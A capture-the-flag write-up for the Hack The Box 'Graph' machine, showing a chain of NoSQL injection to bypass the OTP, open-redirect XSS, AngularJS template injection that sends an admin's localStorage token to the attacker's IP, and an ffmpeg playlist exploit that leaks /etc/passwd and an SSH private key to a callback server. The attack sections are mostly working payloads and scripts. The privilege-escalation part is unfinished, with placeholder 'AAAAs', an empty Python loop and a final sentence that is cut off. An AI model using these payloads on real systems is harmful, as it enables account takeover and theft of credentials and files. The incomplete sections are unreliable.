> Author: **[Xclow3n][author-profile]**

## Discovery

### Services

```shell
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 34:a9:bf:8f:ec:b8:d7:0e:cf:8d:e6:a2:ce:67:4f:30 (RSA)
|   256 45:e1:0c:64:95:17:92:82:a0:b4:35:7b:68:ac:4c:e1 (ECDSA)
|_  256 49:e7:c7:5e:6a:37:99:e5:26:ea:0e:eb:43:c4:88:59 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://graph.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
```

```shell
PORT      STATE         SERVICE
68/udp    open|filtered dhcpc
139/udp   open|filtered netbios-ssn
363/udp   open|filtered rsvp_tunnel
944/udp   open|filtered unknown
999/udp   open|filtered applix
1031/udp  open|filtered iad2
1041/udp  open|filtered danf-ak2
1043/udp  open|filtered boinc
1053/udp  open|filtered remote-as
1090/udp  open|filtered ff-fms
1105/udp  open|filtered ftranhc
1645/udp  open|filtered radius
3456/udp  open|filtered IISrpc-or-vat
5353/udp  open|filtered zeroconf
6002/udp  open|filtered X11:2
9001/udp  open|filtered etlservicemgr
16697/udp open|filtered unknown
16912/udp open|filtered unknown
17091/udp open|filtered unknown
17505/udp open|filtered unknown
18331/udp open|filtered unknown
18449/udp open|filtered unknown
19935/udp open|filtered unknown
20279/udp open|filtered unknown
20409/udp open|filtered unknown
21131/udp open|filtered unknown
21206/udp open|filtered unknown
21468/udp open|filtered unknown
21868/udp open|filtered unknown
21948/udp open|filtered unknown
22043/udp open|filtered unknown
22109/udp open|filtered unknown
27195/udp open|filtered unknown
30544/udp open|filtered unknown
30718/udp open|filtered unknown
32780/udp open|filtered sometimes-rpc24
33866/udp open|filtered unknown
41446/udp open|filtered unknown
41896/udp open|filtered unknown
42508/udp open|filtered candp
48189/udp open|filtered unknown
49181/udp open|filtered unknown
49189/udp open|filtered unknown
50164/udp open|filtered unknown
61685/udp open|filtered unknown
```

### Vhosts

The frontpage redirects to `http://graph.htb`, which goes straight into `/etc/hosts`
and allows to enumerate subdomains:

```shell
gobuster vhost -u http://10.10.11.157 --domain graph.htb --append-domain -w /usr/share/wordlists/discovery/subdomains-top1million-20000.txt -o discovery/graph.htb/vhosts
# Found: internal.graph.htb (Status: 200) [Size: 607
```

### Web browsing

On port 80, the frontpage is empty but it implements an open redirect:

```javascript
if(param[0] === "?redirect"){
	window.location.replace(param[1]);
}
```

The "internal" vhost lands on a login page, and as expected, there's a "register" page too:

![][internal-registration]

It then asks for a OTP:

![][registration-otp]

Trying a few directories from the GraphQL queries, we land on a dashboard. It is
still disabled because we're unauthenticated:

![][disabled-dashboard]

But we can see an internal URL:

```
http://internal.graph.htb/inbox
```

May-be the redirection will load the page on the server and send it to us?

```
http://graph.htb/?redirect=http://internal.graph.htb/inbox
```

Doesn't work! The mail / inbox is just out of reach, it would have

### GraphQL

Login requests are handled by `internal-api.graph.htb`, a `GraphQL` API:

```
POST /graphql HTTP/1.1
Host: internal-api.graph.htb
Content-Length: 279
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
Content-Type: application/json
Origin: http://internal.graph.htb
Referer: http://internal.graph.htb/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

{"variables":{"email":"admin@admin.com","password":"admin"},"query":"mutation ($email: String!, $password: String!) {\n  login(email: $email, password: $password) {\n    email\n    username\n    adminToken\n    id\n    admin\n    firstname\n    lastname\n    __typename\n  }\n}"}
```

If this GQL is anything like SQL it should lead to injection: this would allow
to bypass / overwrite the OTP.

#### Getting the schema

[Hacktricks][hacktricks-graphql] shows how to retrive the information about all the parameters:

```shell
curl -i -s -k -X $'POST' \
    -H $'Content-Type: application/json' \
    --data-binary $'{\"query\":\"{__schema{types{name,fields{name, args{name,description,type{name, kind, ofType{name, kind}}}}}}}\"}' \
    $'http://internal-api.graph.htb/graphql'
```

There are a few interesting queries / objects available: messages, upload, tasks, user.

For example:

```json
{
    "kind": "OBJECT",
    "name": "Query",
    "description": "",
    "fields": [
        {
            "name": "Messages",
            "description": "",
            "args": [],
            "type": {
                "kind": "LIST",
                "name": null,
                "ofType": {
                    "kind": "NON_NULL",
                    "name": null,
                    "ofType": {
                        "kind": "OBJECT",
                        "name": "Message",
                        "ofType": null
                    }
                }
            },
            "isDeprecated": false,
            "deprecationReason": null
        },
        {
            "name": "tasks",
            "description": "",
            "args": [
                {
                    "name": "username",
                    "description": "",
                    "type": {
                        "kind": "NON_NULL",
                        "name": null,
                        "ofType": {
                            "kind": "SCALAR",
                            "name": "String",
                            "ofType": null
                        }
                    },
                    "defaultValue": null
                }
            ],
            "type": {
                "kind": "LIST",
                "name": null,
                "ofType": {
                    "kind": "NON_NULL",
                    "name": null,
                    "ofType": {
                        "kind": "OBJECT",
                        "name": "task",
                        "ofType": null
                    }
                }
            },
            "isDeprecated": false,
            "deprecationReason": null
        }
    ],
    "inputFields": null,
    "interfaces": [],
    "enumValues": null,
    "possibleTypes": null
}
```

#### Testing GraphQL queries

When asking for the messages:

```json
{
    "variables": {},
    "query": "{\n  Messages {\n    toUserName\n    fromUserName\n    text\n    to\n    from\n    __typename\n  }\n}"
}
```

The server blocks the request and asks for a cookie / authentication:

```json
"message":"No Cookie"
```

The user table cannot be queried:

```json
{
    "variables": {},
    "query": "{\n  User {\n    id\n    email\n    token\n    admin\n    adminToken\n    firstname\n    lastname\n  }\n}"
}
```

```json
"message":"Cannot query field \"User\" on type \"Query\".",
```

Same goes with an update operation:

```json
{"operationName":"update","variables":{"firstname":"ape","lastname":"hex","id":0,"newusername":"apehex"},"query":"mutation update($newusername: String!, $id: ID!, $firstname: String!, $lastname: String!) {\n  update(\n    newusername: $newusername\n    id: $id\n    firstname: $firstname\n    lastname: $lastname\n  ) {\n    username\n    email\n    id\n    firstname\n    lastname\n    __typename\n  }\n}"}
```

```json
"code":"UNAUTHENTICATED"
```

Still the tasks can be queried by anyone:

```json
{
    "variables": {"username": "Sally"},
    "query": "query($username: String!){\n tasks(username: $username){\n Assignedto\n username\n text\n taskstatus\n type\n}\n}"
}
```

And it leaks user ids:

```json
{
    "data": {
        "tasks": [
            {"Assignedto": "629a846186ac7d05add16881", "username": null, "text": "Lorem ipsum", "taskstatus": "completed", "type": "development"}]
    }
}
```


## Registering a new user

When registering a new user, the server asks for a OTP. This is done by POSTING
to `/api/verify` with a query like:

```json
{
    "email": "apehex@graph.htb",
    "code": "1234"
}
```

This query is injectable:

```json
{
    "email": "apehex@graph.htb",
    "code": {"$ne":"1234"}
}
```

So `internal.graph.htb/register` queries `internal-api.graph.htb/api/code` and then `internal-api.graph.htb/api/verify`.

But once the email is verified, we still have to fill in the user fields. Since I queried the API directly through BurpSuite, the front-end didn't update.

The webpage links to length JavaScript files... Looking for "register", "code" and the like I found:

```javascript
registerUser(n, r, i) {
    this.http.post("http://internal-api.graph.htb/api/register", {
        email: this.email,
        password: r,
        confirmPassword: i,
        username: n
    }).subscribe(o=>{
        "Account Created Please Login!" === o.result && window.location.replace(""),
        this.result = o.result,
        setTimeout(()=>{
            this.result = ""
        }
        , 5e3)
    }
    )
}
```

The script steps through the whole registration process. So the next step is to query `internal-api.graph.htb/api/register`:

```json
{
    "email": "apehex@graph.htb",
    "password": "heyhey",
    "confirmPassword": "heyhey",
    "username": "apehex"
}
```

```json
{"result":"Account Created Please Login!"}
```

The whole process is easily scripted:

```shell
curl -i -s -k -X $'POST' \
    -H $'Host: internal-api.graph.htb' \
    -H $'Content-Type: application/json' \
    --data-binary $'{\"email\":\"apehex@graph.htb\"}' \
    $'http://internal-api.graph.htb/api/code' \
    --next -i -s -k -X $'POST' \
    -H $'Host: internal-api.graph.htb' \
    -H $'Content-Type: application/json' \
    --data-binary $'{\"email\":\"apehex@graph.htb\",\"code\":{\"$ne\":\"1234\"}}' \
    $'http://internal-api.graph.htb/api/verify' \
    --next -i -s -k -X $'POST' \
    -H $'Host: internal-api.graph.htb' \
    -H $'Content-Type: application/json' \
    --data-binary $'{\"email\":\"apehex@graph.htb\",\"password\":\"heyhey\",\"confirmPassword\":\"heyhey\",\"username\":\"apehex\"}' \
    $'http://internal-api.graph.htb/api/register'
```

## Exploring the dashboard

Upon connection a JWT cookie appears:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjYyOGI1MTM0ZjQ5ODFlMDQzNzIwMDVkNSIsImVtYWlsIjoiYXBlaGV4QGdyYXBoLmh0YiIsImlhdCI6MTY1MzI5NzUwMSwiZXhwIjoxNjUzMzgzOTAxfQ.bdH-hdSldmdH6B9I6vdsq6-yC1r8YIoCiSSMzEJyD3E
```

This allows to query messages:

```json
{"variables":{},"query":"{\n  Messages {\n    toUserName\n    fromUserName\n    text\n    to\n    from\n    __typename\n  }\n}"}
```

```json
{"data":{"Messages":[{"toUserName":"apehex","fromUserName":"Mark","text":"Hey, We just realized that this email is not listed in our employee list. Can you send any links or documents so we can verify them on our end? Thanks","to":"apehex@graph.htb","from":"mark@graph.htb","__typename":"Message"}]}}
```

There's a user "Mark" that reviewed our registration, so most likely a privileged user.

I noticed that the webapp is using the local storage:

```javascript
Login(n, r) {
    this.apollo.mutate({
        mutation: YL,
        variables: {
            email: n,
            password: r
        },
        errorPolicy: "all"
    }).subscribe(i=>{
        null === i.data && (this.errors = "Invalid Credentials"),
        i.data.login.username && (localStorage.setItem("username", i.data.login.username),
        localStorage.setItem("id", i.data.login.id),
        localStorage.setItem("email", i.data.login.email),
        localStorage.setItem("admin", i.data.login.admin),
        i.data.login.adminToken && localStorage.setItem("adminToken", i.data.login.adminToken),
        localStorage.setItem("firstname", i.data.login.firstname),
        localStorage.setItem("lastname", i.data.login.lastname),
        window.location.replace("/dashboard"))
    }
    )
}
```

These values can be edited in the dev tools:

![][local-storage]

Which makes the "upload" tab appear:

![][upload-form]

But uploading requires an `adminToken`:

```json
{"result": "Invalid Token" }
```

The dashboard is using AngularJS, and the profile page is vulnerable to SSTI! The firstname / lastname are reflected on each page and make perfect targets:

```javascript
{{$on.constructor('alert(1)')()}}
```

## Getting admin credentials on the web portal

### Triggering the payload

Since we can message "Mark", there may be a way to gain his token. Let's poke Larry / Mark / James with a link to our server:

```json
{"variables":{"to":"larry@graph.htb","text":"yo Larry!\n<img src=\"http://graph.htb/?redirect=http://10.10.16.4:8888/unlock.html\">"},"query":"mutation ($to: String!, $text: String!) {\n  sendMessage(to: $to, text: $text) {\n    toUserName\n    fromUserName\n    text\n    to\n    from\n    __typename\n  }\n}"}
```

Which they actually follow:

```
Ncat: Connection from 10.10.11.157:51338.
/GET /%7B%7D HTTP/1.1
Host: 10.10.16.2:9999
```

But the page is opened from a context where the local storage is empty: `%7B%7D` is `{}`.

Next, let's try and inject JS directly into the redirect argument:

```
http://graph.htb/?redirect=javascript:alert(1)
```

Still, I couldn't get the admin token because the execution context must be `internal.graph.htb` and not `graph.htb`.

The localstorage is not shared, and the [technique using `<iframe>`][share-localstorage] tags did not work for me.

I also looked up the author and saw a [blog post about a similar XSS][xss-blogpost], but the keylogger idea is not relevant here.

```javascript
var r=document.createElement("script");r.src="http://10.10.16.4:8888/keylogger.js";document.head.appendChild(r);var x=;
```

### Scripting each step

The whole exfiltration process involves 2 actions.

#### Getting the admin user id

```shell
bash payloads/get_userid.sh Mark
# 629a92724c761106406708ca
```

```shell
curl -i -s -k -X $'POST' \
    -H $'Host: internal-api.graph.htb' \
    -H $'Content-Type: application/json' \
    --data-binary $'{\"variables\": {\"username\": \"'"$@"$'\"}, \"query\": \"query($username: String!){\\n tasks(username: $username){\\n Assignedto\\n username\\n text\\n taskstatus\\n type\\n}\\n}\"}' \
    $'http://internal-api.graph.htb/graphql' |
perl -ne $'m#"Assignedto":"([a-fA-F0-9]+)"# && print $1."\n"'
```

#### Redirecting the admin user

First, encode the payloads and include it in the open redirect:

```shell
PAYLOAD=$(echo -n "$@" | base64 -w 0)
echo 'http://graph.htb/?redirect=javascript:eval(atob("'"${PAYLOAD}"'"));'
```

For some reason, the "=" padding needs to be removed for JS to decode the payload:

```
http://graph.htb/?redirect=javascript:alert(atob("ZmV0Y2goImh0dHA6Ly8xMC4xMC4xNi40Ojk5OTkvP3N0b3JhZ2U9IitidG9hKEpTT04uc3RyaW5naWZ5KGxvY2FsU3RvcmFnZSkpKQ"))
```

Then it can be pasted in the messaging panel.

#### Updating the admin profile

The redirect is used to take advantage of the SSTI on the user profile. The SSTI payload is planted after updating the admin profile with GraphQL:

```json
{"operationName":"update","variables":{"firstname":"{{$on.constructor('alert(1);')()}}","lastname":"null","id":"629b97099e22050421afde2d","newusername":"apehex"},"query":"mutation update($newusername: String!, $id: ID!, $firstname: String!, $lastname: String!) {\n  update(\n    newusername: $newusername\n    id: $id\n    firstname: $firstname\n    lastname: $lastname\n  ) {\n    username\n    email\n    id\n    firstname\n    lastname\n    __typename\n  }\n}"}
```

Which can be queried via JS:

```javascript
fetch("http://internal-api.graph.htb/graphql", {
    method: "POST",
    headers: {"Content-Type": "application/json",},
    credentials: "include",
    body: JSON.stringify({"operationName":"update","variables":{"firstname":"{{$on.constructor('alert(1);')()}}","lastname":"null","id":"629b97099e22050421afde2d","newusername":"apehex"},"query":"mutation update($newusername: String!, $id: ID!, $firstname: String!, $lastname: String!) {\n update(\n newusername: $newusername\n id: $id\n firstname: $firstname\n lastname: $lastname\n) {\n username\n email\n id\n firstname\n lastname\n __typename\n}\n}"}),
})
```

### Reading the local storage

The previous SSTI payload can be improved to read the local storage:

```javascript
{{$on.constructor('new Image.src="http://10.10.16.2:9999/?t="+window.localStorage.getItem("adminToken");')()}}
```

This can be parametrized and encapsulated into a JS fetch request:

```shell
PAYLOAD='{{$on.constructor("+String.fromCharCode(39)+"new Image().src="+String.fromCharCode(34)+"http://'"${IP}"'/?token="+String.fromCharCode(34)+"+window.localStorage.getItem("+String.fromCharCode(34)+"adminToken"+String.fromCharCode(34)+");"+String.fromCharCode(39)+")()}}'
CODE='var request = new XMLHttpRequest();request.open("POST","http://internal-api.graph.htb/graphql",false);request.setRequestHeader("Content-Type","text/plain");request.withCredentials=true;request.send(JSON.stringify({"operationName":"update","variables":{"firstname":"'"${PAYLOAD}"'","lastname":"null","id":"'"${ID}"'","newusername":"'"${USERNAME}"'"},"query":"mutation update($newusername: String!, $id: ID!, $firstname: String!, $lastname: String!) {update(newusername:$newusername,id:$id,firstname:$firstname,lastname:$lastname) {username,email,id,firstname,lastname,adminToken}}"}))'
```

The special characters like quotes are added by the JS interpreter rather than planted from the start, since it caused encoding problems.

Also the request is made synchronously, I had issues with `fetch`.

### Exfiltrate and admin token

Now the exfiltration process is more straightforward:

```shell
# create a new web user
bash payloads/register.sh
# get the user id of the admin that sends a message
bash payloads/get_userid.sh Mark
# craft a redirect XSS to inject the exfiltration payload in the admin profile
bash payloads/ssti_profile.sh $'629babb17f2d0a05fc3730f1' $'Mark' $'10.10.16.2:9999' | uglifyjs > exfil.js
# generate the redirection URL
bash payloads/redirect.sh $(cat exfil.js) > url.txt
# finally, send the resulting URL to the admin by message
# and then redirect to the logout to actually load the code from the server
```

And fi-nal-ly exfiltrate an "adminToken"! O-M-G...

Hopefully the box made it obvious this was the way, otherwise I'd have dropped this XSS attempt long ago...

> `c0b9db4c8e4bbb24d59a3aaffa8c8b83`

## Exploiting ffmpeg

The `uploads` endpoint uses `ffmpeg` to convert the uploaded file, which is known to have a LFR vulnerability.

[This report][hackerone-tiktok] describes the exploitation steps, and it is [coded here][pat-ffmpeg].

The code is tweaked to implement the solution from "ach" on Hackerone. It injects a playlist in a minimal avi file, which calls back to the server:

```python
TXT_PLAYLIST = """#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
concat:http://10.10.16.2:8888/header.m3u8|subfile,,start,{start},end,10000,,:{file}
#EXT-X-ENDLIST"""
```

The line breaks have to be accounted for:

```shell
python payloads/generate_avi_lfr.py --start 32 /etc/passwd ~/downloads/test.avi
```

```
Ncat: Connection from 10.10.11.157:33112.
GET /?daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin HTTP/1.1
```

Reading `/etc/passwd` will allow to find an active user and hopefully a SSH key:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
user:x:1000:1000:user:/home/user:/bin/bash
```

All these to learn that the user is named "user"...

```shell
python payloads/generate_avi_lfr.py /home/user/.ssh/id_rsa test.avi --start 377
curl -i -s -k -X $'POST' \
    -H $'Host: internal-api.graph.htb' \
    -H $'admintoken: c0b9db4c8e4bbb24d59a3aaffa8c8b83' \
    -H $'Content-Type: multipart/form-data;' \
    -F $'file=@test.avi' \
    $'http://internal-api.graph.htb/admin/video/upload'
```

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACAvdFWzL7vVSn9cH6fgB3Sgtt2OG4XRGYh5ugf8FLAYDAAAAJjebJ3U3myd
1AAAAAtzc2gtZWQyNTUxOQAAACAvdFWzL7vVSn9cH6fgB3Sgtt2OG4XRGYh5ugf8FLAYDA
AAAEDzdpSxHTz6JXGQhbQsRsDbZoJ+8d3FI5MZ1SJ4NGmdYC90VbMvu9VKf1wfp+AHdKC2
3Y4bhdEZiHm6B/wUsBgMAAAADnVzZXJAb3ZlcmdyYXBoAQIDBAUGBw==
-----END OPENSSH PRIVATE KEY-----
```

## Nreport

### Identifying a potential PE vector

There's unique file running as root:

```shell
ps auxf
# \_ /usr/sbin/CRON -f
#     \_ /bin/sh -c sh -c 'socat tcp4-listen:9851,reuseaddr,fork,bind=127.0.0.1 exec:/usr/local/bin/Nreport/nreport,pty,stderr'
#         \_ sh -c socat tcp4-listen:9851,reuseaddr,fork,bind=127.0.0.1 exec:/usr/local/bin/Nreport/nreport,pty,stderr
#             \_ socat tcp4-listen:9851,reuseaddr,fork,bind=127.0.0.1 exec:/usr/local/bin/Nreport/nreport,pty,stderr
pspy
# 2022/06/05 18:27:16 CMD: UID=0    PID=949    | socat tcp4-listen:9851,reuseaddr,fork,bind=127.0.0.1 exec:/usr/local/bin/Nreport/nreport,pty,stderr
# 2022/06/05 18:27:16 CMD: UID=0    PID=948    | sh -c socat tcp4-listen:9851,reuseaddr,fork,bind=127.0.0.1 exec:/usr/local/bin/Nreport/nreport,pty,stderr
# 2022/06/05 18:27:16 CMD: UID=0    PID=947    | /bin/sh -c sh -c 'socat tcp4-listen:9851,reuseaddr,fork,bind=127.0.0.1 exec:/usr/local/bin/Nreport/nreport,pty,stderr'
# 2022/06/05 18:27:16 CMD: UID=0    PID=946    | /usr/sbin/atd -f
# 2022/06/05 18:27:16 CMD: UID=0    PID=940    | /usr/sbin/CRON -f
file /usr/local/bin/Nreport/nreport
# /usr/local/bin/Nreport/nreport: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /usr/local/bin/Nreport/libc/ld-2.25.so, for GNU/Linux 3.2.0, BuildID[sha1]=fab56bbb7a23ada8a8f5943b527d16f3cdcb09e5, not stripped
```

There's an instance running as root, clearly the target here. When run manually it asks for a "token":

```shell
ltrace /usr/local/bin/Nreport/nreport 
# puts("Custom Reporting v1\n"Custom Reporting v1
# )                                                      = 21
# printf("Enter Your Token: ")                                                       = 18
# fgets(Enter Your Token: c0b9db4c8e4bbb24d59a3aaffa8c8b83
# "c0b9db4c8e4bbb24d5", 19, 0x7f4ce0c978c0)                                    = 0x4041f8
# strlen("c0b9db4c8e4bbb24d5")                                                       = 18
# Invalid Token
# exit(0 <no return ...>
# +++ exited (status 0) +++
```

The admin token from the web dashboard doesn't work here.

### Finding a valid token

Looking at the exported functions in Ghidra, the token check is implemented by `auth`:

```c
printf("Enter Your Token: ");
fgets(userinfo1 + 120, 19, stdin);
sVar1 = strlen(userinfo1 + 120);
if (sVar1 != 15) {
puts("Invalid Token");
                /* WARNING: Subroutine does not return */
exit(0);
}
for (i = 13; -1 < i; i = i + -1) {
*(uint *)((long)&local_48 + (long)i * 4) =
     *(uint *)(secret + (long)i * 4) ^ (int)userinfo1[121] ^ (int)userinfo1[122] ^
     (int)userinfo1[120] ^ (int)userinfo1[129] ^ (int)userinfo1[133];
}
if ((int)local_40 + (int)local_48 + local_48._4_4_ != 0x134) {
puts("Invalid Token");
                /* WARNING: Subroutine does not return */
exit(0);
}
if (local_28._4_4_ + local_30._4_4_ + (int)local_28 != 0x145) {
puts("Invalid Token");
                /* WARNING: Subroutine does not return */
exit(0);
}
```

This will require some debugging! The binary needs to be moved inside its original location to work:

```shell
readelf -a nreport
# Tag        Type                         Name/Value
# 0x000000000000001d (RUNPATH)            Library runpath: [/usr/local/bin/Nreport/libc/]
```

Stepping through allows to read the secret:

```shell
x/14xw 0x4040c0
# 0x4040c0 <secret>:  0x00000012  0x00000001  0x00000012  0x00000004
# 0x4040d0 <secret+16>:   0x00000042  0x00000014  0x00000006  0x0000001f
# 0x4040e0 <secret+32>:   0x00000007  0x00000016  0x00000001  0x00000010
# 0x4040f0 <secret+48>:   0x00000040  0x00000000
```

In Python:

```python
SECRET = []
for i in range(13, -1, -1):
    pass
```



> AAAAAAAAAAAAAs

### Trying to write files

```c
printf("File stored At: %s\n",0x40420c);
```

This memory address is written by:

```c
userinfo1._140_8_ = 0x7672632f74706f2f;
userinfo1._148_2_ = 0x2f31;
userinfo1[150] = 0;
```

Which is:

```python
bytes.fromhex('7672632F74706F2F')[::-1]
# b'/opt/crv'
bytes.fromhex('2F31')[::-1]
# b'1/'
```

And then it is concatenated with the given username:

```c
strcat(userinfo1 + 0x8c,userinfo1);
```

Since `0x8c` is 140, the start of the path.

So the files are supposed to be saved at `/opt/crv1/username`.

`opt/crv` doesn't exist, so the process just fails with `SIGSEGV` even with a username like `../../tmp/test`.

### Hijacking

Option 5 executes a stored command!

```c
system(userinfo1 + 0x28);
```

And `0x404180 + 0x28 = 0x4041a8` contains:

```c
userinfo1._40_8_ = 0x614c22206f686365;
userinfo1._48_8_ = 0x2064657355207473;
userinfo1._56_8_ = 0x7461642824206e4f;
userinfo1._64_8_ = 0x2f203e3e20222965;
userinfo1._72_8_ = 0x2f676f6c2f726176;
userinfo1._80_8_ = 0x74726f7065726b;
```

```python
CMD = ['614c22206f686365', '2064657355207473', '7461642824206e4f', '2f203e3e20222965', '2f676f6c2f726176', '74726f7065726b']
print([bytes.fromhex(s)[::-1] for s in CMD])
# [b'echo "La', b'st Used ', b'On $(dat', b'e)" >> /', b'var/log/', b'kreport']
```

Essentially this is an eval of `date`. The `nreport` binary is already running with its own environment, so we can't tamper the `$PATH`.

May-be the string itself can be overwritten?

### Overwritting the stored command

```c
else {
printf("Enter number to edit: ");
__isoc99_scanf("%d[^\n]",&local_14);
printf("Message Title: ");
__isoc99_scanf(" %59[^\n]",*(undefined8 *)(message_array + (long)local_14 * 8));
printf("Message: ");
__isoc99_scanf("%100[^\n]",*(long *)(message_array + (long)local_14 * 8) + 0x3c);
fflush(stdin);
fflush(stdout);
}
```

```
0x40411c = global Arrayindex = number of messages in the heap
0x404120 = global message_array = pointer to the chunks in the heap allocated by calloc() upon create()
0x404180 = global userinfo1 = username
0x4041a8 = global userinfo1 + 0x28 = the above echo command (hardcoded in auth())
0x40421c = local = the path to /opt/crv1/username ("/opt/crv1/" is also hardcoded in auth())
```

With message index 10, `scanf` will modify the address space starting at `0x4041ac`: the first 4 bits will remain unchanged

AAAAAAAAAAAAAs

[author-profile]: https://app.hackthebox.com/users/172213
[disabled-dashboard]: images/disabled-dashboard.png
[hackerone-tiktok]: https://hackerone.com/reports/1062888
[internal-registration]: images/interal-registration.png*
[local-storage]: images/local-storage.png
[pat-ffmpeg]: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/CVE%20Ffmpeg%20HLS
[registration-otp]: images/registration-otp.png
[share-localstorage]: https://stackoverflow.com/questions/4026479/use-localstorage-across-subdomains
[upload-form]: images/upload-form.png
[xss-blogpost]: https://xclow3n.github.io/bugBounty/myFirstBounty.html
